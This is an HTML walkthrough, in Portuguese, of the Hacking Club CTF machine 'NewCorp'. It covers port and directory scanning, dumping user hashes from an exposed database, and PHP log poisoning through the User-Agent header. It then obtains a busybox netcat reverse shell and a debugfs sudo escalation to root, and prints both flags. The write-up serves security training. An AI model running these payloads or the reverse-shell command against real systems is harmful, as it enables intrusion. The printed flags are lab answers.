<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NewCorp - Walkthrough</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f8ff;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, #115192 0%, #0a4b8f 100%);
            border-radius: 12px;
            color: white;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        h1 {
            font-size: 2.8rem;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.9;
        }
        
        h2 {
            color: #115192;
            margin: 35px 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #115192;
        }
        
        h3 {
            color: #0a4b8f;
            margin: 15px 0 10px;
        }
        
        p {
            margin-bottom: 15px;
        }
        
        .intro {
            background-color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin-bottom: 40px;
            line-height: 1.8;
        }
        
        .cards-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .card {
            background: linear-gradient(145deg, #ffffff, #f5f9ff);
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 25px;
            transition: all 0.3s ease;
            border-top: 5px solid #115192;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #115192, #0a4b8f);
        }
        
        .card:hover {
            transform: translateY(-8px);
            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.15);
        }
        
        .card-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .card-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #115192, #0a4b8f);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 1.5rem;
        }
        
        .card h3 {
            color: #115192;
            margin: 0;
            font-size: 1.4rem;
        }
        
        .card-content {
            color: #444;
            line-height: 1.6;
        }
        
        .highlight {
            background-color: #e8f4ff;
            padding: 12px 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 4px solid #115192;
            font-size: 0.95rem;
        }
        
        .highlight code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }
        
        .section {
            background: linear-gradient(to right, #e8f4ff, #f0f8ff);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin: 40px 0;
            border-left: 5px solid #115192;
        }
        
        .code {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 18px;
            border-radius: 8px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            border-left: 4px solid #115192;
        }
        
        .command {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 12px 15px;
            border-radius: 6px;
            margin: 10px 0;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            display: flex;
            align-items: center;
        }
        
        .command-prefix {
            color: #50fa7b;
            margin-right: 10px;
        }
        
        .example-link {
            display: inline-block;
            background: #115192;
            color: white;
            padding: 10px 20px;
            border-radius: 6px;
            text-decoration: none;
            margin: 10px 0;
            transition: background 0.3s;
        }
        
        .example-link:hover {
            background: #0a4b8f;
        }
        
        footer {
            text-align: center;
            margin-top: 50px;
            padding: 25px;
            color: #666;
            font-size: 0.95rem;
            border-top: 1px solid #ddd;
        }
        
        ul, ol {
            margin-left: 20px;
            margin-bottom: 15px;
        }
        
        li {
            margin-bottom: 8px;
        }
        
        .image-container {
            width: 100%;
            margin: 20px 0;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border: 2px solid #115192;
        }
        
        .image-container img {
            width: 100%;
            display: block;
            transition: transform 0.3s ease;
        }
        
        .image-container:hover img {
            transform: scale(1.02);
        }
        
        .image-caption {
            background: #115192;
            color: white;
            padding: 10px;
            text-align: center;
            font-size: 0.9rem;
        }
        
        .step {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .step-number {
            background-color: #115192;
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
        }
        
        .step-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background-color: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #115192;
            color: white;
        }
        
        tr:hover {
            background-color: #f5f9ff;
        }
        
        @media (max-width: 768px) {
            .cards-container {
                grid-template-columns: 1fr;
            }
            
            header {
                padding: 20px;
            }
            
            h1 {
                font-size: 2.2rem;
            }
            
            .image-container {
                margin: 15px 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>NEWCORP</h1>
            <p class="subtitle">Walkthrough da máquina NewCorp do Hacking Club</p>
        </header>
        
        <section class="intro">
            <h2>Máquina NewCorp</h2>
            <p>Esta é uma máquina CTF (Capture The Flag) do Hacking Club focada em exploração de vulnerabilidades web, log poisoning, injeção de código PHP e escalação de privilégios. O objetivo é explorar vulnerabilidades e obter acesso root ao sistema.</p>
            
            <a href="https://app.hackingclub.com/laboratory/competition-machines/291" target="_blank" class="example-link">
                <i class="fas fa-external-link-alt"></i> Acessar Máquina no Hacking Club
            </a>
            
            <div class="highlight">
                <strong>Nota:</strong> Esta máquina ensina técnicas de log poisoning, injeção de código PHP e escalação de privilégios usando binários com permissão sudo.
            </div>
        </section>
        
        <section class="section">
            <h2>Reconhecimento Inicial</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">1</div>
                    <h3>Escaneamento de Portas</h3>
                </div>
                <p>Primeiro, realize um escaneamento de portas para identificar serviços disponíveis:</p>
                <div class="code">
                    nmap -sV -T5 172.16.7.210
                </div>
                
                <div class="highlight">
                    <strong>Resultado do escaneamento:</strong>
                    <ul>
                        <li>Porta 22/tcp: SSH - OpenSSH 9.6p1 Ubuntu</li>
                        <li>Porta 80/tcp: HTTP - Apache httpd 2.4.58 (Ubuntu)</li>
                    </ul>
                </div>
                
                <p>O resultado mostra dois serviços principais: SSH na porta 22 e um servidor web Apache na porta 80.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">2</div>
                    <h3>Enumeração de Diretórios</h3>
                </div>
                <p>Use o Gobuster para encontrar diretórios e arquivos ocultos no servidor web:</p>
                
                <div class="code">
                    gobuster dir -u http://172.16.7.210/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php
                </div>
                
                <div class="highlight">
                    <strong>Resultado da enumeração:</strong>
                    <ul>
                        <li>/db (Status: 301)</li>
                        <li>/logs (Status: 301)</li>
                        <li>/tags (Status: 301)</li>
                    </ul>
                </div>
                
                <p>Os diretórios <code>/db</code> e <code>/logs</code> são particularmente interessantes para investigação.</p>
            </div>
        </section>
        
        <section class="section">
            <h2>Análise dos Diretórios</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">3</div>
                    <h3>Investigando o Diretório /db</h3>
                </div>
                <p>Ao acessar o diretório <code>/db</code>, encontramos um banco de dados</p>
                
                <div class="highlight">
                    <strong>Conteúdo encontrado:</strong> banco com tabela users com:
                    <ul>
                        <li>id</li>
                        <li>username</li>
                        <li>is_admin</li>
                    </ul>
                </div>
                
                <p>com isso podemos ir para Execute SQL e realizar o comando</p>
                <div class="code">
                    SELECT * FROM users
                </div>
                <div class="highlight">
                    <strong>Conteúdo encontrado:</strong> 
                    <ul>
                        <li>admin: 7025b87ad2c747b6040f124eacd361e9b4240dbc</li>
                        <li>peter: 516fa3fd6bf97a4b3ff09ec93877d39005a7996d</li>
                        <li>solomon: e052b3b52a733baee5577da9aca18b4ef0f22c88</li>
                    </ul>
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">4</div>
                    <h3>Investigando o Diretório /logs</h3>
                </div>
                <p>Ao acessar o diretório <code>/logs</code>, encontramos arquivos de log do servidor:</p>
                
                <div class="highlight">
                    <strong>Arquivos encontrados:</strong>
                    <ul>
                        <li>access.log</li>
                        <li>error.log</li>
                    </ul>
                </div>
                
                <p>Estes arquivos de log podem conter informações sensíveis e podem ser explorados através de log poisoning.</p>
            </div>
        </section>
        
        <section class="section">
            <h2>Exploração via Log Poisoning</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">5</div>
                    <h3>Identificando a Vulnerabilidade</h3>
                </div>
                <p>Ao analisar o conteúdo do arquivo access.log, podemos ver que o servidor está registrando o User-Agent:</p>
                
                <div class="code">
                    # Conteúdo do access.log
                    127.0.0.1 - - [04/Sep/2025:13:41:00 +0000] "GET / HTTP/1.1" 200 705 "-" "Mozilla/5.0..."
                </div>
                
                <p>Esta vulnerabilidade permite que injetemos código PHP malicioso através do cabeçalho User-Agent, que será armazenado no arquivo de log.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">6</div>
                    <h3>Realizando Log Poisoning</h3>
                </div>
                <p>Use o Burp Suite para interceptar uma requisição e modificar o User-Agent para conter código PHP:</p>
                
                <div class="code">
                    &#60;?php system(&#39;ls -la&#39;); ?&#62;
                </div>
                
                <div class="highlight">
                    <strong>interceptar com burp:</strong> aqui para fazer isso precisa abrir o navegador do burp, interceptar, trocar a senha, enviar para o repeter parar de interceptar e depois enviar para o servidor no repeter, se não fizer isso não vai dar pra continuar pq ao parar de interceptar ele gera outra senha
                </div>
                
                <p>Agora, ao acessar o arquivo access.log através do navegador, o código PHP será executado.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">7</div>
                    <h3>Obtendo Shell Reverso</h3>
                </div>
                <p>Para obter um shell reverso, modifique o User-Agent para conter um comando de reverse shell:</p>
                
                <div class="code">
                    &#60;?php system(&#39;busybox nc SEU_IP 4444 -e sh&#39;); ?&#62;
                </div>
                
                <p>Configure um listener na sua máquina:</p>
                
                <div class="code">
                    nc -nlvp 4444
                </div>
                
                <div class="highlight">
                    <strong>Conexão reversa estabelecida:</strong> Shell reverso obtido com sucesso como usuário www-data.
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Primeira Flag</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">8</div>
                    <h3>Exploração do Sistema</h3>
                </div>
                <p>Com acesso ao sistema, procure pela flag de usuário:</p>
                
                <div class="code">
                    script /dev/null -c bash <br>
                    find / -name user.txt 2>/dev/null <br>
                    cat /home/peter/user.txt<br>
                </div>
                
                <div class="highlight">
                    <strong>Flag de usuário encontrada:</strong> hackingclub{440ff1083cff96d275770a893c237a44}
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Escalação de Privilégios</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">9</div>
                    <h3>Identificando Vetores de Escalação</h3>
                </div>
                <p>Para escalar privilégios, verifique quais comandos o usuário pode executar com sudo:</p>
                
                <div class="code">
                    sudo -l
                </div>
                
                <div class="highlight">
                    <strong>Resultado:</strong>
                    <ul>
                        <li>User peter may run the following commands on ip-172-16-15-118: (ALL) NOPASSWD: /usr/sbin/debugfs</li>
                    </ul>
                </div>
                
                <p>O usuário peter pode executar o debugfs como root sem precisar de senha.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">10</div>
                    <h3>Explorando o Debugfs</h3>
                </div>
                <p>Use o GTFOBins para explorar o binário debugfs com permissões sudo:</p>
                <a href="https://gtfobins.github.io/gtfobins/debugfs/" target="_blank" class="example-link">
                    <i class="fas fa-external-link-alt"></i> GTFOBins - debugfs
                </a>
                
                <div class="code">
                    sudo debugfs<br>
                    !/bin/sh<br>
                </div>
                
                <div class="highlight">
                    <strong>Escalação de privilégios bem-sucedida:</strong> Agora você tem acesso como root.
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">11</div>
                    <h3>Obtendo a Flag de Root</h3>
                </div>
                <p>Com acesso root, procure pela flag final:</p>
                
                <div class="code">
                    cd /root<br>
                    ls<br>
                    cat root_fl4g_with_n01_gui333333sing.txt
                </div>
                
                <div class="highlight">
                    <strong>Flag de root capturada:</strong> hackingclub{5ce0ab07e7184a81ed04cf4acd84bd6d}
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Comandos e Técnicas Utilizadas</h2>
            
            <table>
                <tr>
                    <th>Comando/Técnica</th>
                    <th>Descrição</th>
                    <th>Propósito</th>
                </tr>
                <tr>
                    <td><code>nmap -sV</code></td>
                    <td>Escaneamento de versões de serviços</td>
                    <td>Identificar serviços em execução</td>
                </tr>
                <tr>
                    <td><code>gobuster dir</code></td>
                    <td>Enumeração de diretórios web</td>
                    <td>Encontrar paths ocultos</td>
                </tr>
                <tr>
                    <td>Log Poisoning</td>
                    <td>Injeção de código em arquivos de log</td>
                    <td>Executar código PHP no servidor</td>
                </tr>
                <tr>
                    <td><code>sudo -l</code></td>
                    <td>Listar comandos permitidos com sudo</td>
                    <td>Identificar vetores de escalação</td>
                </tr>
                <tr>
                    <td><code>debugfs</code></td>
                    <td>Exploração de binário com sudo</td>
                    <td>Escalar privilégios para root</td>
                </tr>
            </table>
        </section>
        
        <section class="section">
            <h2>Resumo da Exploração</h2>
            
            <div class="cards-container">
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-search"></i>
                        </div>
                        <h3>Reconhecimento</h3>
                    </div>
                    <div class="card-content">
                        <p>Escaneamento de portas e enumeração de diretórios revelaram serviços web e arquivos de log acessíveis.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-bug"></i>
                        </div>
                        <h3>Exploração</h3>
                    </div>
                    <div class="card-content">
                        <p>Log poisoning explorado através da injeção de código PHP no User-Agent para obter shell reverso.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-crown"></i>
                        </div>
                        <h3>Escalação</h3>
                    </div>
                    <div class="card-content">
                        <p>Binário debugfs com permissão sudo explorado para obter privilégios de root e capturar a flag final.</p>
                    </div>
                </div>
            </div>
            
        </section>
        
        <footer>
            <p>NewCorp - Hacking Club | Walkthrough por [Seu Nome]</p>
        </footer>
    </div>
</body>
</html>